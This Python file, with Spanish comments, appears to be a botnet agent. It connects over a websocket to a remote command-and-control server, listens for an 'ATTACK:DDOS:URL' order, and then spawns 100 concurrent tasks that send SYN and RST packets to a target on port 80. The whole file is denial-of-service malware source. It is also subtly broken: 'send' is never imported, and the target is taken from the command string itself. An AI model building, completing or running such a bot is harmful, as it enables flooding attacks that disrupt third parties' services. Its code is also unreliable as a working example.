import asyncio
import json
import websockets
from scapy.all import IP, TCP, sr1
from urllib.parse import urlparse

# Websocket server address
URL = 'mastermw.dr00p3r.top/socket.io/?EIO=4&transport=websocket'
MASTER_URL = f'ws://{URL}'

# Attack Function
async def attack(V_URL, V_PORT):
    try:
        # Optional to get IP (Scapy works better with IPs)
        host = urlparse(f"http://{V_URL}").netloc if not V_URL.startswith(('http', 'https')) else urlparse(V_URL).netloc
        if not host:
            host = V_URL
            
    except Exception as e:
        print(f"Error al analizar la URL: {e}")
        return

    print(f"📡 Intentando enviar SYN packet a: {host}:{V_PORT}")
    syn_packet = IP(dst=host)/TCP(dport=V_PORT, flags="S")

    # --- Envío del Paquete (Bloqueante, ejecutado de forma asíncrona) ---
    # sr1(packet): Envía el paquete y espera la primera respuesta. 
    #              Si no se recibe una respuesta (SYN-ACK), devuelve None.
    # Se utiliza asyncio.to_thread para no bloquear el bucle de eventos (event loop)
    # al llamar a la función sr1 de Scapy, que es síncrona/bloqueante.
    
    try:
        response = await asyncio.to_thread(sr1, syn_packet, timeout=1, verbose=0)
        
        if response and response.haslayer(TCP):
            tcp_layer = response.getlayer(TCP)
            if tcp_layer.flags == 0x12: # 0x12 is SYN-ACK
                print(f"✅ Recibido SYN-ACK de {host}:{V_PORT}. El puerto está abierto.")
                
                rst_packet = IP(dst=host) / TCP(
                    dport=V_PORT, 
                    flags="R", 
                    seq=response.ack, 
                    ack=response.seq + 1
                )
                
                await asyncio.to_thread(send, rst_packet, verbose=0)
                print(f"✔️ Paquete RST enviado a {host}:{V_PORT}.")
                
            elif tcp_layer.flags == 0x4: # 0x04 es RST
                print(f"❌ Recibido RST de {host}:{V_PORT}. El puerto está cerrado o filtrado.")
            else:
                print(f"❓ Recibido un paquete TCP con flags inesperadas: {tcp_layer.flags}")
        else:
            print(f"⏳ No se recibió respuesta de {host}:{V_PORT} (timeout).")

    except Exception as e:
        print(f"🚨 Error durante el envío del paquete: {e}")

# Websocket connection function
async def handler():
    # Get connection
    async with websockets.connect(MASTER_URL) as websocket:
        print(f"Conectado a {MASTER_URL}. Esperando mensajes...")
        try:
            # Receiving messages
            async for message in websocket:
                message_data = json.loads(message)
                
                print(f"Mensaje recibido: {message_data['message']}")
                
                # Attack message
                if message_data['message'] == "ATTACK:DDOS:URL":
                    await process_attack(message_data['message']) 
        except websockets.exceptions.ConnectionClosedOK:
            print("Conexión cerrada por el servidor.")
        except websockets.exceptions.ConnectionClosedError as e:
            print(f"Conexión cerrada con error: {e}")
        except websockets.exceptions.InvalidStatus:
            print('Conexión inválida.')

# Process attack function
async def process_attack(data):
    
    NUM_TASKS = 100
    tasks = []
    
    my_list = data.rsplit(':')
    V_PORT = 80
    
    for i in range(1, NUM_TASKS + 1):
        task = asyncio.create_task(attack(my_list[2], V_PORT))
        tasks.append(task)
        
    await asyncio.gather(*tasks) 


if __name__ == "__main__":
    asyncio.run(handler())  # Init event loop